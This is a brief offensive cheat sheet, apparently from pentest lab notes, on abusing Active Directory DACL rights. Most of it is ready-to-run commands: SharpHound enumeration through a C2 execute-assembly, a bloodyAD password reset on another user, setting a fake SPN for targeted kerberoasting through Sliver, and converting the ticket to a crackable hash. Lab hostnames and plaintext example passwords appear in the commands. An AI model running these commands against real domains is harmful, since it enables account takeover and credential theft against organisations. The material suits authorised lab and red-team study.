---
description: Exploit a DACL or Discretionary Access Control List.
---

# DACL

A DACL (Discretionary Access Control List) is a list of ACEs which are Access Control Entries. This specifies which users or groups are allowed or denied access to computers, smb shares other user account.

#### Use sharphound

```sh
sharp-hound-4 -- -c All --zipfilename academy 
```

Then run SharpHound

```sh
execute-assembly SharpHound.exe -c all
```

With rights change password

```sh
proxychains4 -q bloodyAD --host 172.16.1.15 -d child.htb.local  -u svc_sql -p 'jkhnrjk123!' set password david 'Password123!
```

### <mark style="color:yellow;">GenericWrite via Sliver</mark>

Setup a fake SPN on target, the use c2tc-kerberoast from Sliver to attack

```sh
# Set SPN
proxychains bloodyAD --host 172.16.1.15 -d child.htb.local -u david -p 'Password123!' set object websec servicePrincipalName -v fake/web01.child.htb.local

# Kerberoast
c2tc-kerberoast roast websec

# Convert ticket to a hash
python3 TicketToHashcat.py websec-ticket.enc
```
